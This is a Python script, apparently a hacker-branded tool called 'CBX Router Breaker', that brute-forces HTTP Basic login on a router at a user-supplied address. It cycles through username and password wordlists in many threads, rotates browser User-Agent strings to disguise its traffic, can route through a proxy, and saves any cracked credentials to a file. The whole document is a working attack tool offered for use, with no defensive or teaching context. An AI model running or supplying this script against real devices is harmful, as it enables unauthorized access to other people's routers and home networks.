import requests
import threading
import random
import time

# ==== Colors ====
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# ==== User-Agent List ====
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
]

PROXY = None
DELAY_BETWEEN_REQUESTS = 0.5
lock = threading.Lock()
found = False

# ==== Brute Force Logic ====
def try_login(url, username, password):
    global found
    if found:
        return
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        response = requests.get(url, auth=(username, password), headers=headers, proxies=PROXY, timeout=10)
        if response.status_code == 200:
            with lock:
                if not found:
                    found = True
                    print(f"\n{GREEN}[✓] FOUND: {username}:{password} 🔥{RESET}")
                    with open("found_credentials.txt", "a") as f:
                        f.write(f"{username}:{password}\n")
        else:
            sample = response.text[:80].replace('\n', ' ').replace('\r', ' ')
            print(f"{CYAN}[*] {username}:{password} | Status: {response.status_code} | {sample}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Error: {e}{RESET}")
    time.sleep(DELAY_BETWEEN_REQUESTS)

# ==== Load Username/Password Files ====
def load_list(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] File not found: {file_path}{RESET}")
        exit(1)

# ==== Main Menu ====
def main():
    print(f"""{RED}
███████╗██╗  ██╗██████╗     ██████╗ ██╗  ██╗██╗   ██╗
██╔════╝██║  ██║██╔══██╗   ██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
█████╗  ███████║██████╔╝   ██║   ██║ ╚███╔╝  ╚████╔╝ 
██╔══╝  ██╔══██║██╔═══╝    ██║   ██║ ██╔██╗   ╚██╔╝  
██║     ██║  ██║██║        ╚██████╔╝██╔╝ ██╗   ██║   
╚═╝     ╚═╝  ╚═╝╚═╝         ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
{RESET}
{CYAN}★ CBX Router Breaker | By Zombie Noyon ★{RESET}
🎥 TikTok: {YELLOW}@cbx.noyon{RESET}
🌐 Contact: 🌐 Contact CBX Team → {GREEN}https://cbxnoyon.carrd.co/{RESET}
""")

    # ==== User Inputs ====
    target_ip = input(f"{YELLOW}[?] Target router URL (e.g. http://192.168.0.1/): {RESET}").strip()
    login_mode = input(f"{YELLOW}[?] Login Mode (1 = Password only, 2 = Username+Password): {RESET}").strip()

    if login_mode == "2":
        username_file = input(f"{YELLOW}[?] Username list file: {RESET}").strip()
        usernames = load_list(username_file)
    else:
        usernames = ["admin"]

    password_file = input(f"{YELLOW}[?] Password list file: {RESET}").strip()
    passwords = load_list(password_file)

    print(f"\n{GREEN}[✓] Loaded {len(usernames)} usernames and {len(passwords)} passwords. Starting...{RESET}\n")

    target_url = target_ip if target_ip.startswith("http") else f"http://{target_ip}"
    threads = []

    for username in usernames:
        for password in passwords:
            if found:
                break
            t = threading.Thread(target=try_login, args=(target_url, username, password))
            threads.append(t)
            t.start()
            time.sleep(0.1)
        if found:
            break

    for t in threads:
        t.join()

    if not found:
        print(f"\n{RED}[X] No valid credentials found.{RESET}")
    print(f"{YELLOW}[•] Attack complete. CBX out!{RESET}")

if __name__ == "__main__":
    main()
